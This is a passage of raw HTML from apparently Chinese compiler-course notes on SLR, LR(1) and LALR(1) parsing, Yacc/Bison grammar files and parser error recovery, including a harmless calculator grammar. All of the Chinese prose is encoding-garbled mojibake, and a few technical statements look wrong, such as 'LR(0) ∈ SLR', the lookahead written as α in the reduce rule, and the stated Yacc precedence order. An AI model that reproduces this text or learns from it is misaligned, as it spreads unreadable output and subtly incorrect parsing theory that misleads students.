src=\"/compiler-construction-principles/slr-table.png\" alt=\"SLRåˆ†æè¡¨ï¼šåˆ å»äº†éƒ¨åˆ†è§„çº¦é¡¹\" loading=\"lazy\"></p>\n<p>è§„çº¦çš„æ¡ä»¶æ›´ä¸¥æ ¼ï¼Œä¹Ÿå°±â€œè‡ªåŠ¨â€æ¶ˆé™¤äº†ä¸€äº›å†²çªï¼Œä¹Ÿå°±å…è®¸äº†æ›´å¤šè¯­è¨€è¢«çº³å…¥è¯¥æ–‡æ³•ï¼Œå› æ­¤ $\\text{LR(0)} \\in \\text{SLR}$</p>\n<p><strong>å±€é™æ€§</strong>ï¼šæ˜¾ç„¶ä¸èƒ½æ¶ˆé™¤æ‰€æœ‰shift-reduceå†²çªã€‚å¦‚æœäº§ç”Ÿå†²çªå¯¹åº”çš„ç»ˆç»“ç¬¦tæ°å¥½åœ¨Followé›†é‡Œï¼Œå°±æ— æ³•æ¶ˆé™¤ã€‚ä¾‹å¦‚è€ƒè™‘å¦‚ä¸‹æ–‡æ³•ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S&#x27; -&gt; S $</span><br><span class=\"line\">S -&gt; L = R</span><br><span class=\"line\">S -&gt; R</span><br><span class=\"line\">L -&gt; id</span><br><span class=\"line\">L -&gt; * R</span><br><span class=\"line\">R -&gt; L</span><br></pre></td></tr></table></figure>\n\n<p>ç”±æœ€åä¸¤æ¡è§„åˆ™<code>L -&gt; * R</code> <code>R -&gt; L</code>å¯ä»¥çœ‹å‡ºFollow(R)ä¸Follow(L)ä¸¤ä¸ªé›†åˆäº’ç›¸åŒ…å«ï¼Œå³ç›¸ç­‰ï¼Œå³Follow(R)&#x3D;Follow(L)<br>ç„¶è€Œâ€™&#x3D;â€™åœ¨Follow(L)&#x3D;{<code>=</code>,<code>$</code>}ä¸­ï¼Œå› æ­¤æˆ‘ä»¬é‡åˆ°â€™L&#x3D;â€¦â€™æ—¶ä»ç„¶ä¸çŸ¥é“åº”è¯¥æ¥å—ç­‰äºå·è¿›è¡Œshift(è¿™æ ·å°±å¯ä»¥è¿›ä¸€æ­¥åœ¨<code>S-&gt;L=R</code>è¿™ä¸ªäº§ç”Ÿå¼ä¸­å‰è¿›)ï¼Œè¿˜æ˜¯ç›´æ¥ä½¿ç”¨<code>R-&gt;L</code>è¿›è¡Œreduce.<br><img src=\"/compiler-construction-principles/slr-conflict.png\" alt=\"slr-conflict\" loading=\"lazy\"><br><img src=\"/compiler-construction-principles/slr-conflict-table.png\" alt=\"slr-conflict-table\" loading=\"lazy\"></p>\n<p>æˆ‘ä»¬éœ€è¦æ›´å¤šã€æ›´ç²¾ç¡®çš„é™åˆ¶æ‰èƒ½è¿›ä¸€æ­¥é™ä½å†²çªçš„å¯èƒ½ã€‚</p>\n<h3 id=\"LR-1-Parsing\"><a href=\"#LR-1-Parsing\" class=\"headerlink\" title=\"LR(1) Parsing\"></a>LR(1) Parsing</h3><p>åŒ…å«æ›´å¤šä¿¡æ¯ï¼ˆåç»§tokenï¼‰æ¥æ¶ˆé™¤ä¸€äº›å½’çº¦åŠ¨ä½œã€‚<br>ç›¸å½“äºâ€œåˆ†è£‚â€ä¸€äº›LR(0)çŠ¶æ€ï¼Œç²¾ç¡®æŒ‡æ˜ä½•æ—¶åº”è¯¥å½’çº¦ã€‚</p>\n<p><strong>LR(1)é¡¹(item)çš„å½¢å¼ï¼š$ A \\rightarrow \\alpha \\bullet \\beta,\\ a$</strong></p>\n<p>é€—å·åçš„aæ˜¯ <strong>å‘å‰çœ‹ç¬¦å·(lookahead symbol)</strong> å³è¡¨æ˜å‘å‰çœ‹ä¸€ä¸ªç»ˆç»“ç¬¦ï¼Œå¯ä»¥æ˜¯<code>$</code>.<br>å’ŒLR(0)å¯¹æ¯”ï¼Œå¤„ç†Îµ-moveæ—¶è®°å½•åˆæ³•çš„å‘å‰çœ‹ç¬¦å·w.</p>\n<p>å„ç§è®¡ç®—ï¼š</p>\n<ul>\n<li><p>è®¡ç®—Closure<br>å¯¹äºçŠ¶æ€Iä¸­çš„ä¸€ä¸ªitem $$A\\rightarrow \\alpha \\bullet X \\beta,\\ z$$ ä»¥åŠä¸€ä¸ªäº§ç”Ÿå¼ $$X\\rightarrow \\gamma$$<br>æˆ‘ä»¬<strong>é€’å½’åœ°</strong>å¯»æ‰¾æ‰€æœ‰ $w\\in \\text{First}(\\beta z)$ ç„¶ååŠ å…¥Iï¼š$I\\cup&#x3D;{(X\\rightarrow \\bullet \\gamma,\\ w) | \\forall w\\in \\text{First}(\\beta z) }$ï¼ˆç›´åˆ°ä¸åŠ¨ç‚¹ä¸ºæ­¢ï¼‰<br>èµ·å§‹çŠ¶æ€æ˜¯ $Sâ€™\\rightarrow \\bullet S \\$,\\ ?$ çš„é—­åŒ…</p>\n<ul>\n<li>æˆ‘ä»¬ä¸å…³å¿ƒâ€?â€å¤„æ˜¯ä»€ä¹ˆï¼Œå› ä¸ºæˆ‘ä»¬æ°¸è¿œä¸ä¼šç§»è¿›<code>$</code>.<br>æ‰€ä»¥ä¸€ç§å¯è¡Œçš„è¡¨ç¤ºæ˜¯æŠŠ<code>$</code>éƒ½ç§»åˆ°äº§ç”Ÿå¼å¤–éƒ¨ï¼Œè€ŒéçœŸçš„è¦äº§ç”Ÿä¸€ä¸ª<code>$</code>ç¬¦å·ï¼š $Sâ€™\\rightarrow \\bullet S,\\ \\$$ï¼‰<br>æˆ–è€…ä½ ä¹Ÿå¯ä»¥ç›´æ¥å†™ä½œï¼š$Sâ€™\\rightarrow \\bullet S\\$,\\ ?$ ï¼ˆæ¨èï¼‰</li>\n</ul>\n</li>\n<li><p>è®¡ç®—Gotoè¡¨<br>åŸºæœ¬å’ŒLR(0)ç®—æ³•ä¿æŒç›¸åŒï¼Œç§»å…¥åŠ¨ä½œä¸è€ƒè™‘å‘å‰çœ‹ç¬¦å·z<br>ä¹Ÿå°±æ˜¯å¯¹äºè½¬ç§»Xï¼Œè½¬ç§»å‰åé¡¹çš„å˜æ¢æ˜¯ï¼š<br>$$A \\rightarrow \\alpha \\bullet X \\beta,\\ z \\ \\ \\Rightarrow\\ \\ A \\rightarrow \\alpha X \\bullet \\beta,\\ z$$</p>\n</li>\n<li><p>è®¡ç®—Actionè¡¨ï¼šReduceæ“ä½œ</p>\n<p>è§„çº¦æ“ä½œæ˜¯å˜æ¢è¾ƒå¤§çš„éƒ¨åˆ†ã€‚<br>åœ¨LR(1)ä¸­ï¼ŒActionè¡¨é¡¹ä¸­Reduceæ“ä½œå½¢å¦‚$(I, z, A\\rightarrow \\alpha)$</p>\n<ul>\n<li>I: ä»£è¡¨çŠ¶æ€Iå¯¹åº”çš„è¡Œ</li>\n<li>z: ä»£è¡¨å‘å‰çœ‹ç¬¦å·</li>\n<li>$ A\\rightarrow \\alpha $ ä¸ºè§„çº¦æ‰€é‡‡ç”¨çš„äº§ç”Ÿå¼<br>è¿™å°±é™åˆ¶äº†ä»æŸä¸ªå¯è§„çº¦é¡¹è§„çº¦æ—¶ï¼Œå¿…é¡»å‘å‰çœ‹ä¸€ä¸ªç¬¦å·ä»¥ç¡®ä¿å®ƒæ˜¯lookahead symbol.</li>\n</ul>\n<p><img src=\"/compiler-construction-principles/lr1-items.png\" alt=\"lr1 items\" loading=\"lazy\"></p>\n</li>\n</ul>\n<p><strong>å±€é™æ€§</strong>ï¼šè¿™æ ·çš„æ–‡æ³•é™åˆ¶è¿‡å°‘ï¼Œè¿‡äºçµæ´»ï¼Œå¯¼è‡´çŠ¶æ€æ•°é‡è¿‡å¤šï¼ŒçŠ¶æ€è¡¨è¿‡äºåºå¤§ã€‚<br><img src=\"/compiler-construction-principles/lr1-con.png\" alt=\"lr1 con\" loading=\"lazy\"><br><img src=\"/compiler-construction-principles/lr1-dfa.png\" alt=\"lr1 dfa\" loading=\"lazy\"></p>\n<blockquote>\n<p>æ³¨ï¼šè¯è™½å¦‚æ­¤ï¼Œæ–‡æ³•ä»ç„¶å¯èƒ½å› ä¸ºR-Rå†²çªä¸S-Rå†²çªä»è€Œå¯¼è‡´å…¶ä¸å±äºLR(1)ï¼è¿™æ ·çš„ä¾‹å­å¯ä»¥åœ¨LR(k)ä¸”k&gt;1çš„æ–‡æ³•ä¸­å¤§é‡æ‰¾åˆ°ã€‚</p>\n</blockquote>\n<p>å› æ­¤æˆ‘ä»¬åœ¨SLR(1)&#x3D;Simple LR(1)ä¸LR(1)ä¹‹é—´æŠ˜ä¸­ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªæ–°æ–‡æ³•LALR(1).</p>\n<h3 id=\"LALR-1-Parsing\"><a href=\"#LALR-1-Parsing\" class=\"headerlink\" title=\"LALR(1) Parsing\"></a>LALR(1) Parsing</h3><p>LALR &#x3D; Look-Ahead LR</p>\n<p>åŠ¨æœºï¼šå‘ç°å¾ˆå¤šLR(1)ä¸­çš„çŠ¶æ€éƒ½åªæœ‰lookahead symbolçš„åŒºåˆ«ã€‚èƒ½å¦åˆå¹¶ï¼Ÿ</p>\n<p><strong>LALR(1): æŠŠLR(1)ä¸­åªæœ‰lookahead symbolä¸åŒçš„itemåˆå¹¶ã€‚</strong></p>\n<p>å®šä¹‰ï¼šæŠŠLR(1)ä¸­itemçš„é›†åˆé‡Œæ‰€æœ‰lookahead symbolå»æ‰ï¼Œå‰©ä¸‹çš„ç§°ä¸º<strong>æ ¸(core)</strong><br>æŠŠLR(1)ä¸­æ‰€æœ‰æ ¸ç›¸åŒçš„çŠ¶æ€ä¸¤ä¸¤åˆå¹¶ä¸ºä¸€ä¸ªçŠ¶æ€ã€‚æ¯æ¬¡åˆå¹¶éƒ½åˆ é™¤ä¸¤ä¸ªæ—§çŠ¶æ€ï¼Œæ–°å¢ä¸€ä¸ªæ–°çŠ¶æ€ï¼Œå…¥è¾¹å‡ºè¾¹çš„è¿æ¥æ–¹å¼æ˜¯æ˜¾ç„¶çš„ï¼Œç›´æ¥æ¥åœ¨æ–°çŠ¶æ€ä¸Šå³å¯ã€‚<br>æ–°çŠ¶æ€çš„itemæ˜¯ä¸¤ä¸ªæ—§çŠ¶æ€çš„itemçš„å¹¶ï¼ˆå…¶å®å°±æ˜¯æŠŠæ¯ä¸ªitemçš„lookahead symbolåˆå¹¶ä¸€ä¸‹ï¼‰ã€‚</p>\n<p><img src=\"/compiler-construction-principles/lr1-lalr1.png\" alt=\"lr1 to lalr1\" loading=\"lazy\"></p>\n<p>è¿™æ ·å¾—åˆ°çš„è¡¨å°†ä¼šå°å¾ˆå¤šï¼šä¸SLRçš„åˆ†æè¡¨<strong>ä¸€æ ·å¤§</strong>ï¼é€šå¸¸çŠ¶æ€æ•°åªæœ‰LR(1)çš„ååˆ†ä¹‹ä¸€ã€‚ä»˜å‡ºçš„å¾®å°ä»£ä»·ï¼šè§„çº¦-è§„çº¦å†²çª(reduce-reduce conflict)<br>ä¾‹å¦‚å¯¹äºå¦‚ä¸‹æ–‡æ³•ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S -&gt; a E c</span><br><span class=\"line\">   | a F d</span><br><span class=\"line\">   | b F c</span><br><span class=\"line\">   | b E d</span><br><span class=\"line\">E -&gt; e</span><br><span class=\"line\">F -&gt; e</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨LALRåˆ†æè¡¨ä¸­æœ‰ä¸¤ä¸ªçŠ¶æ€ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªã€‚è€Œä¹‹åçš„ä¸‹ä¸ªå­—ç¬¦å°†ä¼šå‡ºç°æ­§ä¹‰ã€‚è¿™ä¸ªå†²çªå¯¹åº”çš„çŠ¶æ€ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E -&gt; e, &#123;c,d&#125;</span><br><span class=\"line\">F -&gt; e, &#123;c,d&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>LR(1)åˆ†æå™¨ï¼šå°†äº§ç”Ÿä¸¤ä¸ªä¸åŒçš„çŠ¶æ€(å›¾ä¸­çš„çŠ¶æ€#6ä¸#9)ï¼Œä¸ä¼šäº§ç”Ÿå†²çªï¼š<img src=\"/compiler-construction-principles/lr1-eg.png\" alt=\"lr1 example\" loading=\"lazy\"></li>\n<li>LALR(1)åˆ†æå™¨ï¼šåªä¼šäº§ç”Ÿä¸€ä¸ªçŠ¶æ€ï¼Œäº§ç”Ÿå†²çª<ul>\n<li>è‹¥ä¸‹ä¸ªè¾“å…¥å­—ç¬¦ä¸ºcæˆ–dï¼Œå¯ä»¥å½’çº¦æˆEæˆ–F</li>\n</ul>\n</li>\n</ul>\n<p>å› æ­¤ï¼Œä¸Šè¿°æ–‡æ³•å¯¹äºLALR(1)æ˜¯äºŒä¹‰çš„ã€‚<br>ä½†è¿™æ˜¯å¯ä»¥æ¥å—çš„ï¼šLALR(1)è¶³ä»¥å¤„ç†ç»å¤§éƒ¨åˆ†ç¨‹åºè®¾è®¡è¯­è¨€ã€‚</p>\n<h2 id=\"Part-6-è¯­æ³•åˆ†ææ‚é¡¹\"><a href=\"#Part-6-è¯­æ³•åˆ†ææ‚é¡¹\" class=\"headerlink\" title=\"Part 6: è¯­æ³•åˆ†ææ‚é¡¹\"></a>Part 6: è¯­æ³•åˆ†ææ‚é¡¹</h2><h3 id=\"è¯­æ³•åˆ†æå™¨çš„ç”Ÿæˆå™¨ï¼šYACC\"><a href=\"#è¯­æ³•åˆ†æå™¨çš„ç”Ÿæˆå™¨ï¼šYACC\" class=\"headerlink\" title=\"è¯­æ³•åˆ†æå™¨çš„ç”Ÿæˆå™¨ï¼šYACC\"></a>è¯­æ³•åˆ†æå™¨çš„ç”Ÿæˆå™¨ï¼šYACC</h3><p>Yacc &#x3D; yet another compiler-compiler:</p>\n<ul>\n<li>åŸºäºLALR(1)</li>\n<li>BNF(Backus Naur Form)èŒƒå¼</li>\n<li>GNUç‰ˆæœ¬åä¸º<em>Bison</em></li>\n<li>æµç¨‹ï¼š<ol>\n<li>Yaccæºç¨‹åº(*.y) &gt;&gt; Yacc Compiler &gt;&gt; Cè¯­è¨€å®ç°çš„LALRåˆ†æå™¨(y.tab.c)</li>\n<li>y.tab.c &gt;&gt; C Compiler &gt;&gt; åˆ†æå™¨å¯æ‰§è¡Œæ–‡ä»¶(<em>.exe&#x2F;</em>.out)</li>\n<li>è¾“å…¥ &gt;&gt; åˆ†æå™¨å¯æ‰§è¡Œæ–‡ä»¶ &gt;&gt; è¾“å‡º</li>\n</ol>\n</li>\n</ul>\n<ol>\n<li><p>Lex</p>\n<ul>\n<li>ä¸€ç§è¯æ³•åˆ†æå™¨çš„ç”Ÿæˆå™¨ï¼Œå°†è¯æ³•è½¬åŒ–ä¸ºè¯æ³•è§£æå™¨yylex()</li>\n<li>Yaccç”Ÿæˆçš„yyparse()å¯ä»¥æ¥å—yylex()è¿›è€Œç”Ÿæˆè¯­æ³•åˆ†æå™¨</li>\n</ul>\n</li>\n<li><p>Yaccæºç¨‹åºç»“æ„</p>\n<ul>\n<li>å£°æ˜<ul>\n<li>Cè¯­è¨€çš„å£°æ˜</li>\n<li>è¯æ³•å•å…ƒçš„å£°æ˜</li>\n</ul>\n</li>\n<li>ç¿»è¯‘è§„åˆ™<ul>\n<li>äº§ç”Ÿå¼</li>\n<li>äº§ç”Ÿå¼ç›¸å…³è¯­ä¹‰åŠ¨ä½œï¼ˆä¾‹å¦‚ç¼–è¯‘æ—¶è®¡ç®—ï¼‰</li>\n</ul>\n</li>\n<li>è¾…åŠ©æ€§Cè¯­è¨€ä¾‹ç¨‹<ul>\n<li>ç›´æ¥æ‹·è´åˆ°ç”Ÿæˆçš„*.tab.cä¸­</li>\n<li>å¯ä»¥åœ¨è¯­ä¹‰åŠ¨ä½œä¸­è°ƒç”¨</li>\n<li>Lexç”Ÿæˆçš„yylex()å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œå¯ä»¥è¿”å›è¯æ³•å•å…ƒ</li>\n</ul>\n</li>\n</ul>\n<p> ä¾‹å¦‚ï¼Œå¯¹äºç¤ºä¾‹æ–‡æ³•ï¼š</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exp â†’ exp addop term | term</span><br><span class=\"line\">addop â†’ + | -</span><br><span class=\"line\">term â†’ term mulop factor | factor</span><br><span class=\"line\">mulop â†’ *</span><br><span class=\"line\">factor â†’ ( exp ) | number</span><br></pre></td></tr></table></figure>\n\n<p> æœ‰ç¤ºä¾‹ç¨‹åºï¼š</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%&#123;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;ctype.h&gt;</span><br><span class=\"line\">int yylex(void);</span><br><span class=\"line\">int yyerror (char * s);</span><br><span class=\"line\">%&#125;</span><br><span class=\"line\">%token NUMBER</span><br><span class=\"line\">%%</span><br><span class=\"line\">command: exp &#123;printf(&quot;%d\\n&quot;, $1);&#125;;</span><br><span class=\"line\">exp: exp &#x27;+&#x27; term &#123;$$ = $1 + $3;&#125;</span><br><span class=\"line\">  | exp &#x27;-&#x27; term &#123;$$ = $1 - $3;&#125;</span><br><span class=\"line\">  | term &#123;$$ = $1&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">term: term &#x27;*&#x27; factor &#123;$$ = $1 * $3;&#125;</span><br><span class=\"line\">    | factor &#123;$$ = $1;&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">factor: NUMBER &#123;$$ = $1;&#125;</span><br><span class=\"line\">      | &#x27;(&#x27; exp &#x27;)&#x27; &#123;$$ = $2;&#125;</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n\n<p> å…¶ä¸­ç¿»è¯‘è§„åˆ™Ruleçš„æ ¼å¼ä¸º <code>Rule &#123;Action Code&#125;</code>ï¼Œä½¿ç”¨è§„åˆ™è§„çº¦åAction Codeå°±ä¼šè¢«æ‰§è¡Œ<br> è¯­ä¹‰åŠ¨ä½œå½¢å¦‚ <code>$$ = $1 + $3</code></p>\n<ul>\n<li><code>$$</code> è¡¨ç¤ºå’Œäº§ç”Ÿå¼å¤´(LHS)ç›¸å…³çš„å±æ€§å€¼</li>\n<li><code>$i</code> è¡¨ç¤ºäº§ç”Ÿå¼ä½“ä¸­ç¬¬iä¸ªæ–‡æ³•ç¬¦å·ï¼ˆç»ˆç»“ç¬¦&#x2F;éç»ˆç»“ç¬¦ï¼‰çš„å±æ€§å€¼</li>\n</ul>\n</li>\n<li><p>æ¶ˆé™¤äºŒä¹‰æ€§ä¸è§£å†³å†²çª</p>\n<ul>\n<li>æ¶ˆé™¤äºŒä¹‰æ€§ï¼š<ul>\n<li>æŒ‡å®šè¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼šå…ˆå‡ºç°çš„ä¼˜å…ˆ</li>\n<li>æŒ‡å®šè¿ç®—ç¬¦ç»“åˆå¾‹ï¼š<code>%left</code>ï¼ˆå·¦ç»“åˆï¼Œä¾‹å¦‚ä¹˜æ³•åŠ æ³•ï¼‰ <code>%right</code>ï¼ˆå³ç»“åˆï¼Œä¾‹å¦‚ä¸€å…ƒè¿ç®—ç¬¦è´Ÿå·ï¼‰</li>\n</ul>\n</li>\n<li>å†²çªè§£å†³<ul>\n<li>è§„çº¦-è§„çº¦å†²çªï¼šå…ˆå‡ºç°çš„äº§ç”Ÿå¼ä¼˜å…ˆé‡‡ç”¨</li>\n<li>ç§»è¿›-è§„çº¦å†²çªï¼šç§»è¿›ä¼˜å…ˆé‡‡ç”¨</li>\n</ul>\n</li>\n<li>æ›´é€šç”¨çš„æ–¹æ³•ï¼šé€šè¿‡æ”¹å†™æ–‡æ³•ï¼Œå¯ä»¥åœ¨æ¶ˆé™¤å†²çªçš„åŒæ—¶å‡å°‘äºŒä¹‰æ€§</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"é”™è¯¯æ¢å¤-1\"><a href=\"#é”™è¯¯æ¢å¤-1\" class=\"headerlink\" title=\"é”™è¯¯æ¢å¤\"></a>é”™è¯¯æ¢å¤</h3><p>åŠ¨æœºï¼šä¸€æ¬¡æ€§æŠ¥å‘Šæ‰€æœ‰é”™è¯¯ï¼Œè€Œéé‡åˆ°ç¬¬ä¸€ä¸ªå°±åœä¸‹ã€‚</p>\n<ul>\n<li>å±€éƒ¨é”™è¯¯æ¢å¤ï¼šè°ƒæ•´Parseè¿‡ç¨‹çš„æ ˆï¼Œä½¿å…¶æ¢å¤åˆ°æ­£å¸¸ä»è€Œç»§ç»­è¿›è¡ŒParsing</li>\n<li>å…¨å±€é”™è¯¯æ¢å¤ï¼šåˆ é™¤&#x2F;æ’å…¥å°½å¯èƒ½å°‘çš„å­—ç¬¦ï¼Œä½¿å¾—æºå­—ç¬¦ä¸²æˆä¸ºåˆæ³•çš„å­—ç¬¦ä¸²</li>\n</ul>\n<ol>\n<li><p>å±€éƒ¨é”™è¯¯æ¢å¤<br> Yaccä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼šä½¿ç”¨ç‰¹æ®Šçš„<code>error</code>ç¬¦å·ï¼ˆç»ˆç»“ç¬¦ï¼‰æ§åˆ¶æ¢å¤è¿‡ç¨‹ã€‚<br> ä¾‹å¦‚ï¼š</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exp -&gt; ( error )</span><br><span class=\"line\">exp -&gt; error ; exp</span><br></pre></td></tr></table></figure>\n\n<p> äºæ˜¯é€šè¿‡è¿™æ ·çš„äº§ç”Ÿå¼ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠé”™è¯¯çš„å½±å“èŒƒå›´æ§åˆ¶åœ¨å³æ‹¬å·å¤„&#x2F;åˆ†å·å¤„ã€‚å¦‚æœè¯­æ³•å¤„ç†æ—¶é‡åˆ°é”™è¯¯ï¼Œå¯ä»¥ä¸€è·¯è·³è¿‡ç›´åˆ°å³æ‹¬å·å’Œåˆ†å·ï¼Œç„¶åç»§ç»­å¤„ç†ã€‚<br> åˆ†å·ã€å³æ‹¬å·è¿™æ ·çš„ç¬¦å·å°±è¢«å«åšsynchronizing token.</p>\n<p> å½“è¯­æ³•åˆ†æå™¨é‡åˆ°é”™è¯¯æ—¶ï¼š</p>\n<ul>\n<li>ä¸æ–­å¼¹å‡ºæ ˆä¸­çŠ¶æ€ï¼Œç›´åˆ°æ ˆé¡¶çŠ¶æ€åŒ…å«é¡¹ $ A \\rightarrow \\bullet error\\ \\alpha$</li>\n<li>åˆ†æå™¨å°†errorç§»å…¥æ ˆä¸­</li>\n<li>å¦‚æœÎ±ä¸ºç©ºï¼Œåˆ†æå™¨ç›´æ¥æ‰§è¡Œå½’çº¦ï¼Œå¹¶è°ƒç”¨ç›¸å…³çš„è¯­ä¹‰åŠ¨ä½œï¼›å¦åˆ™è·³è¿‡ä¸€äº›ç¬¦å·ï¼Œæ‰¾åˆ°å¯ä»¥å½’çº¦ä¸ºÎ±çš„ä¸²ä¸ºæ­¢</li>\n</ul>\n<p> æµç¨‹ç¤ºä¾‹ï¼š<br> <img src=\"/compiler-construction-principles/local-recovery.png\" alt=\"local error recovery\" loading=\"lazy\"></p>\n</li>\n<li><p>å…¨å±€é”™è¯¯æ¢å¤<br> <strong>ä¸è¦æ±‚æŒæ¡ã€‚</strong><br> Burke-Fisher é”™è¯¯æ¢å¤: å¯¹äºåœ¨å‘ç”Ÿé”™è¯¯å¤„ä¹‹å‰çš„Kä¸ªtokenï¼Œæ¯ä¸€å¤„éƒ½å…è®¸æ’å…¥&#x2F;åˆ é™¤&#x2F;ä¿®æ”¹ä¸€ä¸ªtokenï¼Œç›´åˆ°ä¿®å¤æˆåŠŸã€‚<br> ä¼˜åŠ¿ï¼š</p>\n<ul>\n<li>ä¸å¼•å…¥æ–°äº§ç”Ÿå¼ï¼Œä¸æ”¹å˜æ–‡æ³•</li>\n<li>ä¹Ÿä¸æ”¹å˜åˆ†æè¡¨</li>\n</ul>\n<p> å¦‚ä½•åˆ¤å®šä¿®å¤æ˜¯å¦æˆåŠŸï¼šä¿®å¤åï¼Œåœ¨æŠ¥å‘Šé”™è¯¯å¤„ç»§ç»­Parsingç›´åˆ°ä¸‹ä¸€ä¸ªé”™è¯¯å‘ç”Ÿçš„è·ç¦»æœ€é•¿ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œä¿®å¤åèƒ½ä»æœ¬æ¥ç”±äºé”™è¯¯å¡ä½çš„åœ°æ–¹ç»§ç»­å‰è¿›4ä¸ªtokenå°±ç®—æˆåŠŸäº†ï¼‰ã€‚</p>\n<p> å®ç°ï¼šç»´æŠ¤Kä¸ªtokenå‰çš„æ—§æ ˆï¼Œä»¥åŠKä¸ªtokenç»„æˆçš„é˜Ÿåˆ—ã€‚é‡åˆ°é”™è¯¯ååŸºäºæ—§æ ˆå’Œå¢åˆ æ”¹åçš„tokené˜Ÿåˆ—ï¼ˆä¸ä¸€å®šæ˜¯Kä¸ªäº†ï¼‰è¯•å›¾parse. å°è¯•ä¸åŒçš„å¢åˆ æ”¹æ–¹æ¡ˆç›´åˆ°ä¿®å¤æˆåŠŸï¼š<br> <img src=\"/compiler-construction-principles/burke-fisher.png\" alt=\"burke-fisher\" loading=\"lazy\"></p>\n<p> è¯­ä¹‰åŠ¨ä½œéœ€è¦å»¶è¿Ÿåˆ°è¿›å…¥æ—§æ ˆä¸­ï¼ˆè¿›å…¥æ—§æ ˆè¯´æ˜åœ¨è§£ææµç¨‹ä¸­å·²ç»ç¡®å®šäº†ï¼‰å†è¿›è¡Œ</p>\n<ul>\n<li>å¦åˆ™å¦‚æœé‡åˆ°é”™è¯¯ï¼Œé”™è¯¯æ¢å¤å‘ç°åŸæ¥çš„parsingæ–¹å¼ä¸å¯¹æ—¶ï¼Œæ–‡æ³•ç¬¦å·çš„å±æ€§å·²ç»æŒ‰ç…§é”™è¯¯çš„æ–¹å¼è¿ç®—äº†ï¼Œå›å¤©ä¹æœ¯ã€‚</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"è¯­æ³•åˆ†æå°ç»“ï¼šæ–‡æ³•å¯¹æ¯”\"><a href=\"#è¯­æ³•åˆ†æå°ç»“ï¼šæ–‡æ³•å¯¹æ¯”\" class=\"headerlink\" title=\"è¯­æ³•åˆ†æå°ç»“ï¼šæ–‡æ³•å¯¹æ¯”\"></a>è¯­æ³•åˆ†æå°ç»“ï¼šæ–‡æ³•å¯¹æ¯”</h2><h3 id=\"SLR-ä¸-LR-1\"><a href=\"#SLR-ä¸-LR-1\" class=\"headerlink\" title=\"SLR ä¸ LR(1)\"></a>SLR ä¸ LR(1)</h3><table>\n<thead>\n<tr>\n<th></th>\n<th>SLR</th>\n<th>LR(1)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ç§»   è¿›</td>\n<td>$ A\\rightarrow \\alpha \\bullet a \\beta \\in I_i \\\\ \\text{Goto}(I_i,a)&#x3D;I_j \\\\ \\text{Action}[i,a]&#x3D;s_j $</td>\n<td>$ A\\rightarrow \\alpha \\bullet a \\beta \\in I_i \\\\ \\text{Goto}(I_i,a)&#x3D;I_j \\\\ \\text{Action}[i,a]&#x3D;s_j $</td>\n</tr>\n<tr>\n<td>â€”</td>\n<td>â€”</td>\n<td>â€”</td>\n</tr>\n<tr>\n<td>è§„   çº¦</td>\n<td>$ A\\rightarrow \\alpha \\bullet \\in I_i \\\\ \\alpha \\in \\text{Follow}(A) \\\\ \\text{Action}[i,a]&#x3D;r_j$</td>\n<td>$ A\\rightarrow \\alpha \\bullet \\in I_i \\\\ \\text{Action}[i,a]&#x3D;r_j $</td>\n</tr>\n</tbody></table>\n<p>å¯è§å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯SLRåœ¨è§„çº¦æ—¶è¦æ±‚åç»§tokenæ˜¯åœ¨Followé›†é‡Œçš„ã€‚</p>\n<h3 id=\"LL-1-ä¸-LR-1\"><a href=\"#LL-1-ä¸-LR-1\" class=\"headerlink\" title=\"LL(1) ä¸ LR(1)\"></a>LL(1) ä¸ LR(1)</h3><table>\n<thead>\n<tr>\n<th></th>\n<th>LR(1)</th>\n<th>LL(1)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>å»ºç«‹åˆ†ææ 